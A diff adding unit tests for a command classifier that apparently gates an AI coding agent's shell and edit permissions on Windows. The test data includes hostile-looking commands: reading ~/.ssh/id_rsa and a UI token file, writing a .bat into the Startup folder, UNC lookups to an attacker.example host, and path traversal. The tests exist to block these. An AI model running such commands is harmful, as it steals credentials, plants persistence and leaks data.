@@ -92,3 +92,59 @@ test('F1-1: the router asks for agent_task when the context says the turn is tai
     assert.deepEqual(asked, ['agent_task']);
   } finally { t.cleanup(); }
 });
+
+// ---- F1-2 -----------------------------------------------------------------------------------------------------------------------
+
+const SCOPE = { os: 'win32', workspace: WS, trusted: [] };
+
+test('F1-2: the read-only allowlist parses arguments: no writing flags, no paths outside the workspace, no UNC or provider paths', () => {
+  const cfg = oc();
+  const c = (cmd) => classifyCommand(cmd, cfg, SCOPE).class;
+  for (const cmd of [
+    'git diff --output=C:\\Users\\bethe\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\x.bat', 'git log --output=x', 'git show --output x HEAD',
+    'git diff --no-index C:\\Windows\\win.ini x', 'git -C C:\\other status', 'git -c core.pager=calc log', 'git branch evil',
+    'Get-Content C:\\Users\\bethe\\Jarvis-Next\\data\\tokens\\ui.token', 'Get-Content ..\\Jarvis-Next\\data\\tokens\\ui.token', 'cat ~/.ssh/id_rsa',
+    'Get-ChildItem C:\\', 'Get-ItemProperty HKCU:\\Environment', 'Get-Content env:PATH', 'Get-Item Registry::HKEY_CURRENT_USER\\Environment',
+    'Test-Path \\\\deadbeef.attacker.example\\a', 'Test-Path //attacker.example/a', 'Get-Content \\\\?\\C:\\x', 'Get-Content -Path:C:\\x',
+    'Get-Content C:x', 'Get-Content a.txt:secret', 'Get-Content $env:USERPROFILE\\x', 'Get-Content %USERPROFILE%\\x', 'Get-Content -Stream s a.txt',
+    'Get-ChildItem -FollowSymlink', 'Get-Process -ComputerName other', 'npm test', 'C:\\tools\\git.exe status', 'Get-Content GIT~1\\config',
+    'Get-Content a.txt,..\\..\\Jarvis-Next\\data\\tokens\\ui.token', 'Get-Content -Path a.txt,C:\\x',
+  ]) assert.notEqual(c(cmd), 'allow', cmd);
+  assert.equal(c('Get-Content a.txt,b.txt'), 'allow');
+  assert.equal(classifyCommand('Copy-Item a,..\\..\\x dest', cfg, SCOPE).tier, 'T3'); // PowerShell reads a,b as two paths
+  for (const cmd of [
+    'git status', 'git status --short', 'git diff --stat', 'git diff HEAD~1 -- src/app.js', 'git log --oneline -n 5', 'git log --format="%h %s" -3', 'git show HEAD:src/app.js',
+    'git branch -a', 'git rev-parse --abbrev-ref HEAD', 'ls', 'ls -la src', 'cat README.md', 'head -n 20 src/app.js', 'pwd', 'dir',
+    'Get-ChildItem -Path src -Recurse -Filter *.js', 'Get-Content .\\package.json', 'Get-Content -Path src\\a.js -TotalCount 40', 'Select-String -Path a.js -Pattern foo',
+    'Test-Path -LiteralPath src', 'Get-Date', 'Get-Process node', '$PSVersionTable', 'node --version', 'Get-Location',
+  ]) assert.equal(c(cmd), 'allow', cmd);
+});
+
+test('F1-2: a command that names a path outside the workspace, or that cannot be resolved, is T3', () => {
+  const cfg = oc();
+  const tier = (cmd) => classifyCommand(cmd, cfg, SCOPE).tier;
+  for (const cmd of ['make -C C:\\other', 'cp src\\a.js C:\\Users\\bethe\\Desktop\\a.js', 'cd ..; make', 'cd ..\\..; make', 'copy x \\\\host\\share\\x', 'echo $env:USERPROFILE', 'make OUT=..\\..\\x']) assert.equal(tier(cmd), 'T3', cmd);
+  for (const cmd of ['make build', 'cd src && make', 'npm run build', 'cp src\\a.js dist\\a.js']) assert.equal(tier(cmd), 'T2', cmd);
+});
+
+test('F1-2: Manual asks for everything; Plan never runs anything by itself', () => {
+  const ro = { kind: 'bash', cls: { class: 'allow' }, tier: 'T0' };
+  assert.equal(modeAnswer('manual', ro), null);
+  assert.equal(modeAnswer('plan', ro), null);
+  assert.equal(modeAnswer('plan', { kind: 'webfetch', tier: 'T2' }), null);
+  assert.equal(modeAnswer('plan', { kind: 'external_directory', tier: 'T2' }), null);
+  assert.equal(modeAnswer('plan', { kind: 'edit', tier: 'T2' }), 'reject');
+  assert.equal(modeAnswer('plan', { kind: 'bash', cls: { class: 'ask' }, tier: 'T2' }), 'reject');
+});
+
+test('F1-2: the bridge resolves edit paths: .. out of the workspace is outside; relative paths inside are inside', async () => {
+  const t = bridge({ mode: 'auto' });
+  await t.ask({ permission: 'edit', patterns: ['..\\..\\evil.txt'] });
+  await t.ask({ permission: 'edit', patterns: [`${WS}\\..\\Jarvis-Next\\src\\main.js`] });
+  await t.ask({ permission: 'edit', patterns: ['\\\\host\\share\\x.js'] });
+  assert.deepEqual(t.asked, ['opencode_edit:T3', 'opencode_edit:T3', 'opencode_edit:T3']);
+  await t.ask({ permission: 'edit', patterns: ['src\\app.js'] });
+  await t.bash('git diff --output=x');
+  await t.bash('git status');
+  assert.deepEqual(t.asked.slice(3), ['opencode_bash:T2']);
+});
